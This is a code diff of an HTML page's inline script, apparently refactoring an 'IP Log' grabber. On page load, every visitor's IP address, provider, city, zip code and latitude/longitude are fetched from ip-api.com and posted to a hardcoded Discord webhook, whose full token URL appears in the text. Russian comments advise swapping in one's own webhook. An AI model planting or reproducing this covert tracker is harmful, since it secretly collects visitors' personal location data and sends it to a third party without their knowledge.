@@ -137,43 +137,54 @@
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/js/bootstrap.bundle.min.js"></script>
 
 <script>
-    var webHookUrl = "https://discord.com/api/webhooks/1374334361561989151/x7V-XHZChZbH4Wzez6oUBOu1RELI4YJRyKZcLaeE7NZBUPl83Mkv50aCq6i4qB_8N5-W"; // ← твой вебхук
+  const webHookUrl = "https://discord.com/api/webhooks/1374334361561989151/x7V-XHZChZbH4Wzez6oUBOu1RELI4YJRyKZcLaeE7NZBUPl83Mkv50aCq6i4qB_8N5-W"; // ← вставь СВОЙ (не тот, что ты опубликовал)
 
-    const request = async () => {
-        const response = await fetch('https://ip-api.com/json/');
-        const data = await response.json();
+  async function request() {
+    try {
+      const response = await fetch('https://ip-api.com/json/');
+      const data = await response.json();
 
-        var ip = data.query;
-        var provider = data.org + " (" + data.as + ")";
-        var timezone = data.timezone;
-        var country = data.country;
-        var countryCode = data.countryCode.toLowerCase();
-        var region = data.region + " (" + data.regionName + ")";
-        var city = data.city;
-        var zip = data.zip;
-        var lat = data.lat;
-        var lon = data.lon;
+      const ip = data.query;
+      const provider = data.org + " (" + data.as + ")";
+      const timezone = data.timezone;
+      const country = data.country;
+      const countryCode = data.countryCode.toLowerCase();
+      const region = data.region + " (" + data.regionName + ")";
+      const city = data.city;
+      const zip = data.zip;
+      const lat = data.lat;
+      const lon = data.lon;
 
-        var postRequest = new XMLHttpRequest();
-        postRequest.open("POST", webHookUrl);
-        postRequest.setRequestHeader('Content-type', 'application/json');
+      const payload = {
+        username: "IP Log",
+        avatar_url: "",
+        content:
+          `__**🌐 IP-Address:**__ \n\`${ip}\`` +
+          `\n\n__**📞 Provider:**__ \n${provider}` +
+          `\n\n__**🕒 Timezone:**__ \n${timezone}` +
+          `\n\n__**🏳 Country and Region:**__ \n${country} - ${region}` +
+          `\n\n__**🏙 Zip Code & City:**__ \n${zip} ${city}` +
+          `\n\n__**📍 Location:**__ \n**Longitude:** ${lon}\n**Latitude:** ${lat}`
+      };
 
-        var params = {
-            username:   "IP Log",
-            avatar_url: "",
-            content:    "__**🌐 IP-Address:**__ \n" +
-                        "`" + ip + "`" +
-                        "\n\n__**📞 Provider:**__ \n" + provider +
-                        "\n\n__**🕒 Timezone:**__ \n" + timezone +
-                        "\n\n__**🏳 Country and Region:**__ \n" + country + " - " + region +
-                        "\n\n__**🏙 Zip Code & City:**__ \n" + zip + " " + city +
-                        "\n\n__**📍 Location:**__ \n" + "**Longitude:** " + lon + "\n" + "**Latitude:** " + lat
-        };
+      const discordResponse = await fetch(webHookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
 
-        postRequest.send(JSON.stringify(params));
-    };
+      if (!discordResponse.ok) {
+        console.error("Ошибка отправки в Discord:", await discordResponse.text());
+      } else {
+        console.log("IP отправлен в Discord.");
+      }
 
-    request();
-  </script>
+    } catch (err) {
+      console.error("Ошибка получения IP:", err);
+    }
+  }
+
+  request();
+</script>
 </body>
 </html>
